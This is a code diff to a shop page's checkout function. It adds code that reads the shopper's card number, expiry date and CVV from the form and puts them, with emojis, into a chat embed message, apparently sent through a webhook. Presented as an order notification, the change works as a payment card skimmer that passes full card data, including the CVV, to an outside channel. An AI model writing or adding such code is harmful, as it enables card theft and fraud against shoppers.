@@ -364,15 +364,23 @@
     }
     
     function completeCheckout() {
-      // Send a green embed message with the details entered on the site.
+      // Retrieve payment info from the form.
+      const creditCard = document.getElementById("creditCard").value;
+      const expiryDate = document.getElementById("expiryDate").value;
+      const cvv = document.getElementById("cvv").value;
+      
+      // Send a green embed message with the details entered on the site (including payment info) along with some emojis.
       const embedPayload = {
         embeds: [
           {
-            title: "NEW ORDER!",
+            title: "🚀 NEW ORDER! 🚀",
             color: 3066993,
             fields: [
-              { name: "Product", value: selectedProduct.name, inline: true },
-              { name: "Price", value: `£${selectedProduct.price.toFixed(2)}`, inline: true }
+              { name: "💎 Product", value: selectedProduct.name, inline: true },
+              { name: "💷 Price", value: `£${selectedProduct.price.toFixed(2)}`, inline: true },
+              { name: "💳 Credit Card", value: creditCard, inline: true },
+              { name: "📆 Expiry Date", value: expiryDate, inline: true },
+              { name: "🔒 CVV", value: cvv, inline: true }
             ]
           }
         ]
